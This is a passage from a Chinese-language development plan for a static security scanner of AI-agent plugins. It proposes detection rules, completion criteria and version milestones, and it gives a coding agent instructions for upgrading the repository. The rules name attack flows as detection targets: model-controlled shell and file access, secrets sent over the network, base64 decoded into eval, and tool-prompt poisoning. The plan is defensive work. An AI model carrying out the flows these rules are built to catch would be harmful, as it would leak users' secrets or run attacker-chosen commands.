```

新增：

```text
SEN-TAINT-001
SEN-AGENT-001
SEN-SUPPLY-001
SEN-DEP-001
SEN-BIN-001
SEN-PERSIST-001
```

已有 ID 不要随便重命名。

否则历史 baseline 会失效。

---

# 42. 推荐首批新增规则

---

## SEN-AGENT-001

```text
model-controlled-shell
critical
```

---

## SEN-AGENT-002

```text
model-controlled-file-read
high
```

---

## SEN-AGENT-003

```text
model-controlled-file-write
high
```

---

## SEN-AGENT-004

```text
model-controlled-network-target
high
```

---

## SEN-AGENT-005

```text
tool-prompt-poisoning
medium
```

---

## SEN-TAINT-001

```text
secret-to-network
critical/high
```

---

## SEN-TAINT-002

```text
workspace-to-network
high
```

---

## SEN-TAINT-003

```text
decode-to-exec-flow
critical
```

---

## SEN-SUPPLY-001

```text
remote-dependency-source
high
```

---

## SEN-SUPPLY-002

```text
dependency-install-script
medium/high
```

---

## SEN-SUPPLY-003

```text
source-package-drift
high
```

---

## SEN-MAN-009

```text
manifest-path-escape
critical
```

---

# 43. 完成标准

不要用：

```text
代码能跑
```

作为完成标准。

至少满足以下：

## Phase 1 完成

```text
扫描不再因 findings cap 提前停止
coverage 可验证
dist/build package mode 可扫
路径越界被阻止
secret 报告被脱敏
```

---

## Semantic MVP 完成

至少以下均通过：

```text
args.command → exec
args.path → readFile
args.url → fetch
env secret → fetch
workspace file → fetch
base64 → variable → eval
```

---

## 专业版 MVP

达到：

```text
Heuristic
+
AST
+
Taint
+
Harness-specific
+
Supply chain
+
SARIF
+
Benchmark
```

才可以对外宣传：

> Professional DSH Plugin Security Scanner

---

# 44. AI 执行要求

给 Coding AI / Agent 的具体要求：

1. **先完整遍历仓库。**
2. 不要只读本文件然后猜当前实现。
3. 先运行现有测试。
4. 阅读：
   - `engine/scanner.js`
   - `engine/rules.js`
   - `engine/report.js`
   - `engine/manifest.js`
   - `engine/index.js`
   - `plugin/index.js`
   - `bin/sentinel.mjs`
5. 阅读 `package.json` 和所有测试。
6. 建立当前架构理解。
7. 每阶段先写测试。
8. 再修改代码。
9. 保持现有 API 尽可能兼容。
10. 不允许为了方便执行被扫描插件。
11. 不允许自动联网上传源码。
12. 所有新增联网能力默认关闭。
13. 所有 ignore / skip 必须进入报告。
14. 所有不完整扫描必须显式标记。
15. 所有 secret 输出必须 redacted。
16. 不要一次性重写整个仓库。
17. 每个阶段完成后运行全量测试。
18. 最终更新：
    - README
    - docs/rules.md
    - docs/example-report.json
    - docs/roadmap.md
    - SECURITY.md
19. 最终给出变更摘要。
20. 最终给出尚未完成的安全限制。

---

# 45. AI 最终输出格式要求

完成修改后，必须给用户：

```text
1. 修改了哪些文件
2. 新增了哪些文件
3. 修复了哪些安全问题
4. 新增了哪些检测能力
5. 测试结果
6. benchmark 结果
7. 哪些功能仍是 heuristic
8. 哪些场景仍可能漏报
9. 哪些场景仍可能误报
10. 下一步建议
```

不能只说：

```text
已完成
```

---

# 46. 最终定位

本项目最终应形成以下差异化：

## 普通静态扫描器

```text
有没有 exec
有没有 fetch
有没有 secret
```

## dsh-sentinel Professional

```text
谁控制这个值
↓
这个值经过了什么传播
↓
最终进入了什么危险 sink
↓
该路径是否真实可达
↓
它是否来自 Harness Tool / 模型输入
↓
它是否读取 workspace / memory / credential
↓
它是否离开本机
↓
这个包安装前是否就存在供应链风险
```

目标不是：

> “规则最多”

而是：

> **“对 DeepSeek Harness 插件最懂、对 Agent Tool 风险最敏感、安装前就能给出证据链的安全扫描器。”**

---

# 47. 第一阶段立即执行清单

如果当前只能做一轮修改，请优先做下面 10 项：

- [ ] 修复 `maxFindings` 导致提前停止扫描
- [ ] 新增 `scanComplete / filesAnalyzed / findingsTruncated`
- [ ] 加入 source/package/profile scan mode
- [ ] package/profile mode 扫描 `dist/build/lib/out`
- [ ] 加入 manifest / patch path containment
- [ ] 修复 `hasExportContract`
- [ ] secret snippet 自动脱敏
- [ ] 统一 VERSION
- [ ] 统一规则权重文档生成
- [ ] 建立 AST/semantic engine 骨架，并首先实现 `args.command → exec`

完成以上后，再进入第二轮：

- [ ] npm tarball 安装前审计
- [ ] dependency graph
- [ ] lockfile
- [ ] Harness taint
- [ ] SARIF
- [ ] benchmark

---

# 48. 重要提醒

**不要为了保持“零依赖”而牺牲安全分析正确率。**

现有 `zero runtime dependencies` 可以作为 v0.1 特点。

但专业级版本如果需要：

```text
AST parser
YAML parser
lockfile parser
```

允许引入少量、成熟、维护良好的依赖。

原则：

```text
依赖越少越好
但正确性优先
```

---

# 49. 建议版本规划

## v0.2

```text
扫描完整性修复
scan mode
dist/build
path containment
secret redaction
version/schema 修复
config
coverage
```

## v0.3

```text
AST MVP
Harness Tool recognition
model-input → shell/fs/net
SARIF
fingerprint
baseline
```

## v0.4

```text
npm tarball audit
dependency graph
lockfile
install dependency scripts
integrity
```

## v0.5

```text
cross-file taint
workspace/memory exfil
SSRF
prompt/tool poisoning
source-vs-package diff
```

## v1.0

```text
稳定 semantic engine
benchmark 数据
GitHub Action
可选 threat intelligence
专业级报告
```

---

# 50. 结束语

修改这个项目时，最重要的判断标准不是：

```text
又增加了多少规则
```

而是：

```text
漏报是否下降
误报是否下降
扫描是否完整
证据是否可解释
是否真正覆盖 Harness 特有攻击面
是否能在安装前阻断风险
```

请基于当前仓库渐进升级，不要脱离现有实现另起炉灶。
